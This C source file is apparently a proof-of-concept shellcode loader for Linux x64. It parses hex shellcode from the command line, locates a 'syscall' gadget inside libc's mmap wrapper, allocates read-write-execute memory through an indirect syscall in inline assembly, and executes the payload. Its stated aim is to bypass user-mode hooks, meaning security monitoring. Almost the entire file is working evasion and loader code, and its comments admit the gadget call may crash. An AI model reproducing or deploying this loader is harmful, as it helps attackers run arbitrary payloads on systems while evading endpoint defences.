#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <dlfcn.h>
#include <errno.h>

/*
 * Loader-Indirect.c
 * 
 * Demonstrates "Indirect Syscalls" technique on Linux x64.
 * 
 * standard flow:  App -> libc wrapper (hooked?) -> syscall -> Kernel
 * indirect flow:  App -> find 'syscall' gadget in libc -> setup registers -> jmp to gadget -> Kernel
 * 
 * This bypasses user-mode hooks placed on the libc wrapper functions (e.g. mmap).
 * 
 * Compile: gcc -o Loader-Indirect Loader-Indirect.c -ldl
 * Usage: ./Loader-Indirect <HEX_SHELLCODE>
 */

// Helper to parse hex string
unsigned char* parse_hex(const char* hex_str, size_t* out_len) {
    size_t len = strlen(hex_str);
    if (len % 2 != 0) {
        fprintf(stderr, "[-] Hex string validation failed: Odd length.\n");
        return NULL;
    }
    *out_len = len / 2;
    unsigned char* bytes = malloc(*out_len);
    if (!bytes) return NULL;

    for (size_t i = 0; i < *out_len; i++) {
        sscanf(hex_str + 2*i, "%2hhx", &bytes[i]);
    }
    return bytes;
}

// Find a gadget sequence in memory
// We look for 'syscall' (0x0f 0x05)
void* find_syscall_gadget(void* search_start, size_t search_len) {
    unsigned char* p = (unsigned char*)search_start;
    for (size_t i = 0; i < search_len - 1; i++) {
        if (p[i] == 0x0f && p[i+1] == 0x05) {
            return (void*)(p + i);
        }
    }
    return NULL;
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <HEX_PAYLOAD>\n", argv[0]);
        printf("Example: %s 4831ff...\n", argv[0]);
        return 1;
    }

    printf("[*] Parsing shellcode...\n");
    size_t shellcode_len = 0;
    unsigned char* shellcode = parse_hex(argv[1], &shellcode_len);
    if (!shellcode) return 1;
    printf("[+] Shellcode length: %zu bytes\n", shellcode_len);

    // 1. Locate 'syscall' gadget in libc
    // We use dlsym to find a known function, then scan it.
    // 'mmap' wrapper in libc definitely contains a syscall instruction.
    void* libc_handle = dlopen("libc.so.6", RTLD_LAZY);
    if (!libc_handle) {
        fprintf(stderr, "[-] Failed to open libc: %s\n", dlerror());
        return 1;
    }

    void* mmap_addr = dlsym(libc_handle, "mmap");
    if (!mmap_addr) {
        fprintf(stderr, "[-] Failed to find mmap symbol\n");
        return 1;
    }

    printf("[*] Scanning for syscall gadget near mmap (%p)...\n", mmap_addr);
    void* syscall_gadget = find_syscall_gadget(mmap_addr, 0x100); // 256 bytes scan limit
    
    if (!syscall_gadget) {
        fprintf(stderr, "[-] Failed to find valid syscall gadget in libc stub.\n");
        return 1;
    }
    printf("[+] Found 'syscall' gadget at: %p\n", syscall_gadget);

    // 2. Execute SYS_mmap (9) via Indirect Syscall
    // Prototype: void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
    // Syscall ID (RAX) = 9
    // RDI = addr (0)
    // RSI = length
    // RDX = prot (RWX = 7)
    // R10 = flags (MAP_PRIVATE|MAP_ANONYMOUS = 0x22)
    // R8  = fd (-1)
    // R9  = offset (0)
    
    void* mapped_mem = NULL;
    long sys_mmap_num = 9;
    long flags = MAP_PRIVATE | MAP_ANONYMOUS;
    long fd = -1;

    // We use inline assembly to set registers and jump to our gadget.
    // Note: 'rcx' is used by 'syscall' instruction to store RIP, but here we use it to jump/call.
    // Actually, checking standard calling convention:
    // User -> Libc Wrapper -> syscall
    // We are replacing Libc wrapper.
    // We populate registers and CALL the gadget address (which performs syscall and returns).
    
    printf("[*] Allocating RWX memory via Indirect Syscall...\n");

    asm volatile(
        "mov %1, %%rax\n\t"     // RAX = 9 (sys_mmap)
        "mov %2, %%rdi\n\t"     // RDI = 0
        "mov %3, %%rsi\n\t"     // RSI = length
        "mov %4, %%rdx\n\t"     // RDX = 7 (RWX)
        "mov %5, %%r10\n\t"     // R10 = flags
        "mov %6, %%r8\n\t"      // R8 = fd
        "mov %7, %%r9\n\t"      // R9 = 0
        
        "call *%8\n\t"          // Indirect Call to syscall location in memory
                                // The gadget needs to be 'syscall; ret' for call to work, 
                                // or we manage stack if it's just 'syscall'.
                                // Standard libc wrappers usually do 'syscall; ... ret'.
                                // If we found raw '0f 05' in middle of code, 'call' pushes return address 
                                // and jumps. After 'syscall', execution continues at p+2. 
                                // If p+2 isn't 'ret', we crash. 
                                // SAFETY: We should look for 'syscall' followed by 'ret' or use a known wrapper safe exit.
                                // For simplicity/robustness in this PoC, we assume the gadget 
                                // inside a wrapper eventually returns or we can just JMP if we didn't care about returning.
                                // But we need the address (RAX) back.
                                
        "mov %%rax, %0"         // Save return value (address)
        
        : "=r" (mapped_mem) 
        : "r" ((long)sys_mmap_num), 
          "r" ((long)0), 
          "r" ((long)shellcode_len), 
          "r" ((long)7),        // PROT_READ | PROT_WRITE | PROT_EXEC
          "r" ((long)flags), 
          "r" ((long)fd), 
          "r" ((long)0),
          "r" (syscall_gadget)
        : "rax", "rdi", "rsi", "rdx", "r10", "r8", "r9", "memory"   // Clobbered registers
    );

    if (mapped_mem == MAP_FAILED || (long)mapped_mem < 0) {
        perror("[-] mmap syscall failed");
        return 1;
    }
    printf("[+] Memory allocated at: %p\n", mapped_mem);

    // 3. Copy Shellcode (Standard memcpy)
    // Advanced: Could also use indirect syscall for this if paranoid.
    memcpy(mapped_mem, shellcode, shellcode_len);
    printf("[+] Shellcode copied to memory.\n");

    // 4. Update memory protections (Optional if we allocated RWX already)
    // 5. Execute
    printf("[!] Executing shellcode...\n");
    void (*func)() = (void (*)())mapped_mem;
    func();

    return 0;
}
